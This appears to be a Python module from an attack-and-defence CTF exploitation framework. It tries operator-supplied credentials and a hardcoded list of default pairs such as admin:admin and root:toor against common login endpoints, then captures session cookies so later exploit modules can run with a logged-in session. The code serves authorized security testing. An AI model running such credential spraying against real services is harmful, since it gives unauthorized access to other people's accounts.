"""Auto-login — get a session on an authorized target so exploits attack BEHIND the login.

Many A&D services hide the vulnerable functionality behind authentication. This module tries
to log in with (1) credentials the operator supplied, then (2) a small list of common
weak/default pairs, across common login endpoints. On success it captures the session
cookies and hands them back; :class:`AttackSweep` then injects them into every exploit
module's ``context.extra["cookies"]`` so the whole arsenal runs authenticated.

Read-only and bounded: it submits a capped number of login attempts (no password brute
force), never registers accounts, and never changes server state beyond establishing a
session. Scope is enforced by the orchestrator before this runs.
"""

from __future__ import annotations

import httpx

from ...core.models import ModuleResult, TaskState
from ...core.plugin import Module, ModuleMeta, RunContext

# Common login endpoints, likeliest first.
LOGIN_ENDPOINTS: tuple[str, ...] = (
    "/login", "/login.php", "/admin/login", "/admin", "/auth", "/signin",
    "/session", "/api/login", "/user/login", "/account/login", "/users/sign_in",
    "/wp-login.php",
)
# Field-name aliases sent together so one request matches whatever the form expects.
USER_FIELDS: tuple[str, ...] = ("username", "user", "email", "login", "uname", "name")
PASS_FIELDS: tuple[str, ...] = ("password", "pass", "passwd", "pwd", "pw")
# Weak/default credential pairs commonly left on CTF/A&D services (NOT a brute forcer).
DEFAULT_CREDS: tuple[tuple[str, str], ...] = (
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", "changeme"), ("administrator", "administrator"),
    ("root", "root"), ("root", "toor"), ("user", "user"), ("test", "test"),
    ("guest", "guest"),
)
FAIL_MARKERS = ("invalid", "incorrect", "wrong", "failed", "salah", "gagal",
                "denied", "unauthor", "try again", "bad credential", "login failed")
SUCCESS_MARKERS = ("logout", "dashboard", "welcome", "sign out", "my account",
                   "profile", "admin panel", "log out")


def _parse_creds(context: RunContext) -> list[tuple[str, str]]:
    """Operator-supplied credentials first (``extra['credentials']`` = ['user:pass', ...])."""
    creds: list[tuple[str, str]] = []
    for item in context.extra.get("credentials") or []:
        if isinstance(item, (list, tuple)) and len(item) == 2:
            creds.append((str(item[0]), str(item[1])))
        elif isinstance(item, str) and ":" in item:
            u, p = item.split(":", 1)
            creds.append((u, p))
    for pair in DEFAULT_CREDS:
        if pair not in creds:
            creds.append(pair)
    return creds


def _form(user: str, pw: str) -> dict:
    data = {f: user for f in USER_FIELDS}
    data.update({f: pw for f in PASS_FIELDS})
    data["submit"] = "Login"
    return data


def _looks_authenticated(resp: httpx.Response, had_cookie: bool) -> bool:
    body = resp.text.lower()
    if any(m in body for m in FAIL_MARKERS):
        return False
    redirected = bool(resp.history)  # login pages usually 302 somewhere on success
    good = any(m in body for m in SUCCESS_MARKERS)
    return had_cookie and (redirected or good)


class WebLoginModule(Module):
    meta = ModuleMeta(
        identifier="recon.web_auth",
        description="Auto-login with operator/default credentials to obtain a session for "
                    "authenticated exploitation (read-only, no brute force).",
        supported_kinds=("web", "http"),
        requires_scope=True,
        timeout=25.0,
        category="recon",
        tags=("web", "auth", "login", "session"),
    )

    async def run(self, context: RunContext) -> ModuleResult:
        host = context.target_host
        port = context.target_port or int(context.extra.get("port", 80))
        scheme = context.extra.get("scheme") or ("https" if port in (443, 8443) else "http")
        base = f"{scheme}://{host}:{port}"
        if context.scope is not None:
            context.scope.enforce(host, port)

        # Discovered login-ish endpoints first, then the static list.
        discovered = [e for e in (context.extra.get("discovered_endpoints") or [])
                      if any(w in e.lower() for w in ("login", "signin", "auth", "session"))]
        endpoints = list(dict.fromkeys([*discovered, *LOGIN_ENDPOINTS]))
        creds = _parse_creds(context)
        cap = int(context.extra.get("max_login_attempts", 60))
        verify = bool(context.extra.get("tls_verify", False))

        attempts = 0
        tried: list[str] = []
        for ep in endpoints:
            for user, pw in creds:
                if attempts >= cap:
                    break
                attempts += 1
                tried.append(f"{ep} {user}:{'*' * len(pw)}")
                try:
                    # Fresh client per attempt so the cookie jar reflects only this login.
                    async with httpx.AsyncClient(timeout=self.meta.timeout,
                                                 follow_redirects=True, verify=verify) as client:
                        form = _form(user, pw)
                        if ep.startswith("/api") or ep.endswith(".json"):
                            resp = await client.post(base + ep,
                                                     json={"username": user, "password": pw})
                        else:
                            resp = await client.post(base + ep, data=form)
                        had_cookie = len(client.cookies) > 0
                        if _looks_authenticated(resp, had_cookie):
                            cookies = {k: v for k, v in client.cookies.items()}
                            return ModuleResult(
                                module=self.identifier, target=host,
                                state=TaskState.SUCCEEDED,
                                detail=f"logged in at {ep} as {user} "
                                       f"({len(cookies)} cookie(s)); authenticated session ready",
                                data={"authenticated": True, "cookies": cookies,
                                      "login_endpoint": ep, "username": user,
                                      "attempts": attempts},
                            )
                except httpx.HTTPError:
                    continue
            if attempts >= cap:
                break

        return ModuleResult(
            module=self.identifier, target=host, state=TaskState.SUCCEEDED,
            detail=f"no login succeeded in {attempts} attempt(s) "
                   f"(tried default/weak creds across {len(endpoints)} endpoint(s))",
            data={"authenticated": False, "cookies": {}, "attempts": attempts},
        )
